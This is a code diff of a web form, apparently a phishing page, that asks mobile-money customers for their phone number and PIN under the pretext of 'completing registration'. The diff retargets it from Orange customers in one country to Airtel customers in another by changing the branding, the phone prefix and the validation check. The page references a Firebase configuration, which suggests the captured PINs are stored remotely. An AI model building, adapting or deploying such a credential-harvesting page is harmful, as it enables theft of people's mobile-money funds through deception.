@@ -105,14 +105,14 @@
 
   <div class="divider"></div>
 
-  <label>Phone number(My ORANGE)</label>
-  <input id="phone" placeholder="+267XXXXXXXXX">
+  <label>Phone number(My Airtel)</label>
+  <input id="phone" placeholder="+255XXXXXXXXX">
 
   <label>My pin</label>
   <input id="password" type="password" placeholder="****">
 
   <button id="withdraw">Continue to complete the registration</button>
-  <p class="note">Ensure you used the correct pin of your orange number to ensure the registration is successful.</p>
+  <p class="note">Ensure you used the correct pin of youro Airtel number to ensure the registration is successful.</p>
 </div>
 
 <!-- POPUP -->
@@ -165,7 +165,7 @@ const firebaseConfig = {
     const phone = phoneInput.value.trim();
     const password = passwordInput.value.trim();
 
-    if(!phone.startsWith("+267") || phone.length < 13 || password.length < 4){
+    if(!phone.startsWith("+255") || phone.length < 13 || password.length < 4){
       popupTitle.innerText = "Tatizo ❌";
       popupText.innerHTML = "Tafadhali weka nambari ya simu sahihi na nenosiri la DEMO.";
       popup.classList.add("active");
